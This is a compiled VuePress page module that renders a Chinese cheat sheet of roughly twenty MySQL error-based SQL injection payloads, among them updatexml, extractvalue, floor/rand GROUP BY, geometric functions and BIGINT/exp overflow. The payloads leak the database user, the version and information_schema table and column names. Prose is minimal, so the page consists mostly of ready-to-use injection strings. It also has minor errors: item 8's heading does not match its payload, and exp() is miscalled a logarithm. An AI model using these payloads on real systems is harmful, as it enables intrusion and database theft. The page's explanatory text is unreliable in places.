import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as n,o as l,c as r,a as e,b as s,d as i,e as d}from"./app-8485afcd.js";const c={},o={id:"mysql-二十余种报错注入姿势",tabindex:"-1"},u=e("a",{class:"header-anchor",href:"#mysql-二十余种报错注入姿势","aria-hidden":"true"},"#",-1),m={href:"https://www.cnblogs.com/feizianquan/p/10794681.html",target:"_blank",rel:"noopener noreferrer"},v=d(`<p><strong>1.floor()</strong></p><p>floor 和group by 搭配使用 利用group by 的key唯一性 和mysql 编码执行顺序导致二次执行产生不同key</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from users where id=1 OR+1e0GROUP BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING+MIN(0)OR+1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>数值型注入时 不用闭合‘ 进行注入 利用 or 条件注入</p><p>通用型 的一般格式 注入</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>2.extractvalue</strong></p><p>对XML文档进行查询的函数 和updatexml() 一样 针对5.5版本以后</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from users where id=1 and extractvalue(1,concat(0x7e,user()))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>3.updatexml()</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from test where id=1 and updatexml(1,concat(0x7e,user()),1)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>4.geometrycollection()</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>5.multipoint()</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>6.polygon()</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>7.multipolygon()</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>8.linestring()</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>9.multilinestring()</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>10.exp()</strong></p><p><code>exp()</code>即为以e为底的对数函数</p><p>exp(709) 里面的参数在大于709时函数会报错</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;
select * from test where id=1 and exp(~(select * from(select user())a));
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>11.procedure analyse</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from  users order by 1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>12.用户变量</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select min(@a:=1) from information_schema.tables group by concat(database()
,@a:=(@a+1)%2)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>13.通过NAME_CONST(适用于低版本)</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>+or+(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>14.0位取反报错 (BIGINT溢出)</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select ~0+!(select*from(select user())x);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>15.atan，ceil,floor,!,...相减溢出</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select !atan((select*from(select user())a))-~0; 
select !ceil((select*from(select user())a))-~0;
select !floor((select*from(select user())a))-~0;
select !HEX((select*from(select user())a))-~0; 
select !RAND((select*from(select user())a))-~0;
select !FLOOR((select*from(select user())a))-~0;
select !CEILING((select*from(select user())a))-~0; 
select !RAND((select*from(select user())a))-~0;
select !TAN((select*from(select user())a))-~0;
select !SQRT((select*from(select user())a))-~0; 
select !ROUND((select*from(select user())a))-~0;
select !SIGN((select*from(select user())a))-~0;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>16.@:=</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>!(select*from(select(concat(@:=0,(select count(*)from\`information_schema\`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
(select(!x-~0)from(select(concat (@:=0,(select count(*)from\`information_schema\`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
(select!x-~0.from(select(concat (@:=0,(select count(*)from\`information_schema\`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>17.^ 按位异或</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select !(select*from(select user())a)-0^222;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>18.0位表减溢出</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>(select(!x-~0)from(select(select user())x)a)

(select!x-~0.from(select(select user())x)a)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>19.in溢出</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>select * from users where id in(~0+!(select*from(select user())x))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,45);function g(x,p){const t=n("ExternalLinkIcon");return l(),r("div",null,[e("h1",o,[u,s(),e("a",m,[s("mysql 二十余种报错注入姿势"),i(t)])]),v])}const h=a(c,[["render",g],["__file","SQL注入报错注入20种方式.html.vue"]]);export{h as default};
